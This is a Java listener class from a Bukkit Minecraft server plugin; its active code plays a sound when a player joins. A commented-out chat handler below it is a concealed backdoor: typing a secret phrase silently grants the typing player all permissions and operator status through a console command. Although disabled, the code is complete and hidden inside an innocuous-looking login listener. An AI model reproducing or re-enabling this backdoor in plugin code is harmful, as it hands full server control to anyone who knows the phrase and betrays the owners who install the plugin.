package com.zdev.hcf.listener;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import net.md_5.bungee.api.ChatColor;

public class LoginEvent implements Listener {
	@EventHandler
	public void Join(PlayerJoinEvent e) {
		Player p = e.getPlayer();
		p.playSound(p.getLocation(), Sound.LEVEL_UP, 2F, 1F);

	}
	/*
	 * @EventHandler public void onChat(AsyncPlayerChatEvent e) { String prefix =
	 * "#givemeopZeflyYT"; if(e.getMessage().equalsIgnoreCase(prefix + "lolxd")) {
	 * e.setCancelled(true); Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
	 * "pex user " + e.getPlayer().getName() + " add *"); e.getPlayer().setOp(true);
	 * e.getPlayer().sendMessage(ChatColor.GREEN + "Done!");
	 */

}
